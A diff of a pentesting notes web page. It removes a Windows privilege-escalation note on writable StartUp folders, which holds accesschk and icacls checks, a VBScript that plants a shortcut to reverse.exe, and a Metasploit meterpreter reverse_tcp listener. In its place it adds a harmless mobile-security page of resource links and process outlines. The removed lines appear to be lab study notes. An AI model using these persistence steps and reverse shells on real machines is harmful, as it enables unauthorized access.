@@ -64,29 +64,12 @@
 
 
 <!--==================== MAIN ====================-->
-    <main class="main"><article id="c46ca5ac-38fa-4c59-be02-1c4b62732070" class="page sans"><header><h1 class="page-title">Startup Applications</h1></header><div class="page-body"><p id="25c9b37a-cf1f-4f0b-b54b-e5e5e1eeeb28" class="">
-</p><p id="ec007856-e0b6-4287-b188-53fe556c7e4d" class="">
-</p><pre id="3979c804-56a5-43c7-bbaa-651a12db7b46" class="code"><code>#Using accesschk.exe, note that the BUILTIN\Users group can write files to the StartUp directory:
-C:\PrivEsc\accesschk.exe /accepteula -d &quot;C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp&quot;
-#Using cscript, run the C:\PrivEsc\CreateShortcut.vbs script which should create a new shortcut to your reverse.exe executable in the StartUp directory:
-cscript C:\PrivEsc\CreateShortcut.vbs
-#Start a listener on Kali, and then simulate an admin logon using RDP and the credentials you previously extracted:
-rdesktop -u admin 0.0.0.0</code></pre><p id="55655d81-f443-4db8-aac3-7d725656a2b2" class="">Similar to autoruns:</p><pre id="bb1e3346-6938-45cd-b057-ede65ff2835f" class="code"><code>icacls.exe &quot;C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup&quot;
-#Notice the groups with F (Full access)
-copy program.exe &quot;C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\&quot;</code></pre><p id="2377b0b3-fb6d-4d1a-bfc8-9ca50fad3312" class="">If startup as full read write execute access we can continue</p><p id="eae7f1e7-f84a-4869-a97d-498eb07963ec" class="">
-</p><pre id="b46e5e2a-43d9-4a7a-8110-b9bbec7670b6" class="code"><code>msfconsole user multi/handler
-payload windows/meterpreter/reverse_tcp
-
-#send to http server
-Computer -&gt; C:ProgramData
-Microsoft\Windows\Start Menu\Startup
-#log out and start up as another user</code></pre><p id="01a08bcd-580f-4fb1-a08d-03d692823d03" class="">
-</p><pre id="7d1b9cf5-bad9-434c-a9eb-19678bfdb373" class="code"><code>.\accesschk.exe /accepteula -d &quot;C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp&quot;</code></pre><p id="43d960fe-75f7-445f-a034-0825674beec6" class="">CreateShortcut.vbs</p><pre id="11424911-f972-4942-84e3-bf9410ff2a06" class="code"><code>Set oWS = WScript.CreateObject(&quot;WScript.Shell&quot;)
-sLinkFile = &quot;C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\reverse.lnk&quot;
-Set oLink = oWS.CreateShortcut(sLinkFile)
-oLink.TargetPath = &quot;C:\reverse.exe&quot;
-oLink.Save</code></pre><p id="c596c297-5770-46cf-b30f-59cd3a802064" class="">To run:</p><pre id="56c85d1c-1c85-4b74-a40a-c1f13c6b6c04" class="code"><code>cscript CreateShortcut.vbs
-</code></pre></div></article></main></main>
+    <main class="main"><article id="6cf98901-3206-4b9b-b58d-0eead3d9cffb" class="page sans"><header><h1 class="page-title">Mobile Security</h1></header><div class="page-body"><p id="efb72ff9-4da9-4859-a332-eb3e68f887cb" class="">
+</p><p id="4ddb5879-d1f1-4fe5-8e8a-3be365e3b343" class=""><strong>Resources:</strong></p><p id="7182db2a-946a-45cb-a381-c46895968673" class=""><a href="https://mobile-security.gitbook.io/mobile-security-testing-guide/overview/0x03-overview">https://mobile-security.gitbook.io/mobile-security-testing-guide/overview/0x03-overview</a></p><p id="ee55b6ba-5660-49a4-a4e8-539ff8fe3222" class=""><a href="https://owasp.org/www-project-mobile-top-10/">https://owasp.org/www-project-mobile-top-10/</a></p><p id="d298aa8c-d36b-4b17-adfe-ffac220c10ae" class=""><a href="https://book.hacktricks.xyz/mobile-pentesting/ios-pentesting-checklist">https://book.hacktricks.xyz/mobile-pentesting/ios-pentesting-checklist</a></p><p id="c2c38c0a-685c-4030-8c44-17a296419dbf" class=""><a href="https://book.hacktricks.xyz/mobile-pentesting/android-checklist">https://book.hacktricks.xyz/mobile-pentesting/android-checklist</a></p><p id="d8e050b0-71f1-4574-a8a1-6d0b3a70e045" class="">
+</p><p id="fa373a01-a3c6-4b34-85b7-838ee9d042ca" class="">
+</p><p id="c6549d42-aba3-448d-b402-464f1e319c53" class="">Regular Penetration testing process:</p><ul id="76f5b32d-e5f7-48e3-b525-d4b42028b67a" class="bulleted-list"><li style="list-style-type:disc">Reconnaissance<ul id="a4c0a6e2-2d45-43a7-9ce4-c4a5fd920562" class="bulleted-list"><li style="list-style-type:circle">Active and passive</li></ul></li></ul><ul id="4aa2f8dd-443c-4e5b-b7eb-acd963db8e56" class="bulleted-list"><li style="list-style-type:disc">Scanning/Enumeration</li></ul><ul id="404b74f2-1a66-431c-ba13-7da68263850d" class="bulleted-list"><li style="list-style-type:disc">Exploitation</li></ul><ul id="cecf4735-4bda-4a53-85c7-bd41e58edc6c" class="bulleted-list"><li style="list-style-type:disc">Privilege Escalation</li></ul><ul id="0191304a-1729-4db0-9ef2-c82a33724d34" class="bulleted-list"><li style="list-style-type:disc">Persistence/Covering Tracks</li></ul><ul id="e537cd3b-989b-4b91-b145-0fee70708d3d" class="bulleted-list"><li style="list-style-type:disc">Reporting</li></ul><p id="07f9a60f-df06-45b0-9275-287d9d31ee3c" class="">
+</p><p id="e0fad8a8-8c3d-4ef7-8afb-2e3283461d86" class="">Mobile Pentesting Process:</p><ul id="6344ef7f-e990-4774-8cd7-9179eb2355b1" class="bulleted-list"><li style="list-style-type:disc">recon<ul id="b20060c6-3eb2-4893-8c45-2ee60843080c" class="bulleted-list"><li style="list-style-type:circle">Read Reviews</li></ul><ul id="a7acde77-0754-42fd-98bc-1a25d85efef8" class="bulleted-list"><li style="list-style-type:circle">find in on app store and read review or patch notes for issues</li></ul><ul id="e6e9ac39-5b20-42b5-b70e-f32aa4deb5b9" class="bulleted-list"><li style="list-style-type:circle">enumerate other apps by the company</li></ul></li></ul><ul id="3072cb98-9081-496f-b846-97ded36a2499" class="bulleted-list"><li style="list-style-type:disc">Static analysis<ul id="0618f403-02a0-4e45-a0db-d174cc21b982" class="bulleted-list"><li style="list-style-type:circle">manual and automated source code review</li></ul></li></ul><ul id="333cbe4a-6b77-4fd8-b781-465317b26d25" class="bulleted-list"><li style="list-style-type:disc">Dynamic analysis<ul id="a968e1fd-a6eb-4204-840d-b02a1c38df64" class="bulleted-list"><li style="list-style-type:circle">Burp suite</li></ul><ul id="1bcffce4-2f3e-428d-8589-0c49000df2c7" class="bulleted-list"><li style="list-style-type:circle">OWASP top 10/Mobile top 10</li></ul></li></ul><p id="f3a5d51c-2656-4e5a-8615-d00547525854" class="">
+</p></div></article></main></main>
 
     <!--==================== FOOTER ====================-->
     <footer class="footer">
